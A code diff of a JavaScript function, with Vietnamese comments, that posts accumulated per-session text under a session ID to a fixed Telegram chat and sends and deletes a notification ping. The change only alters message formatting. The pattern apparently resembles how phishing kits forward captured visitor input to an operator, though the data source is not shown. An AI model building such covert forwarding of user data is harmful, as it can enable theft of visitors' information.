@@ -27,14 +27,13 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
+    // Chỉ nối thêm text thuần, không bọc code
     if (newContent) {
         currentSessionText += `\n${newContent}`;
     }
     
-    // Dùng <code> bọc lại để click là copy được ngay
-    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n`;
-    text += `---------------------------\n`;
-    text += `<code>${currentSessionText}</code>`; // Bọc code ở đây
+    // CHỈ BỌC <code> CHO MÃ PHIÊN ĐỂ CLICK COPY
+    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
 
     const tgFetch = (method, payload) => {
         let bodyStr = '';
@@ -62,7 +61,7 @@ export const sendTelegramMessage = (newContent) => {
             parse_mode: 'HTML' 
         });
         
-        tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔 Cập nhật...' }).then(res => {
+        tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
             }
